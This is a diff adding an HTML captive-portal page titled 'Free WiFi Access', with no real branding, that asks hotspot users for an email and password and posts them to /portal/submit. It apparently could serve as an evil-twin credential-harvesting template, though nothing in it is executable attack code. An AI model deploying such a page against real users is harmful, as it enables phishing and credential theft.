@@ -1,0 +1,34 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>WiFi Login</title>
+<style>
+  html, body { margin:0; padding:0; height:100%; font-family:-apple-system,"Segoe UI",Roboto,sans-serif; background:#fff; color:#222; }
+  body { display:flex; align-items:center; justify-content:center; min-height:100vh; padding:20px; box-sizing:border-box; }
+  .card { border:1px solid #e1e5ea; border-radius:10px; padding:36px 32px; width:min(420px,100%); text-align:center; box-shadow:0 2px 12px rgba(0,0,0,0.04); }
+  .logo { width:56px; height:56px; margin:0 auto 12px; background:#00a8e0; border-radius:50%; color:#fff; display:flex; align-items:center; justify-content:center; font-weight:700; font-size:22px; }
+  h1 { font-size:20px; margin:8px 0 4px; color:#111; font-weight:600; }
+  .sub { color:#6b7780; font-size:13px; margin-bottom:22px; }
+  .form-row { margin:10px 0; text-align:left; }
+  label { display:block; font-size:11px; color:#6b7780; text-transform:uppercase; letter-spacing:0.5px; margin-bottom:4px; font-weight:600; }
+  input { width:100%; padding:12px 14px; font-size:14px; border:1px solid #ced4da; border-radius:6px; box-sizing:border-box; background:#fff; color:#111; }
+  input:focus { outline:none; border-color:#00a8e0; box-shadow:0 0 0 3px rgba(0,168,224,0.15); }
+  button { width:100%; padding:13px; margin-top:18px; background:#00a8e0; color:#fff; border:none; border-radius:6px; font-size:14px; font-weight:600; cursor:pointer; }
+  button:hover { background:#008dbd; }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">W</div>
+  <h1>Free WiFi Access</h1>
+  <div class="sub">Sign in to the hotspot network</div>
+  <form method="POST" action="/portal/submit">
+    <div class="form-row"><label>Email</label><input type="email" name="email" required></div>
+    <div class="form-row"><label>Password</label><input type="password" name="password" required></div>
+    <button type="submit">Connect</button>
+  </form>
+</div>
+</body>
+</html>
